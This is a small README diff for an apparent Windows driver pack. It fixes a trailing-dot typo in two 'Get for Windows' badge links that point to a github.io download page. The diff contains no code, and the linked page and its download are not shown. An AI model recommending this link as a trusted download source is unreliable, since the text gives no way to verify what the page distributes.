@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://sdi-driver-pack.github.io/.github./)
+[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://sdi-driver-pack.github.io/.github/)
 
 </div>
 
@@ -30,7 +30,7 @@ The development and distribution of the driver pack is community-influenced, wit
 
 <div align="center">
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://sdi-driver-pack.github.io/.github./)
+[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://sdi-driver-pack.github.io/.github/)
 
 </div>
 
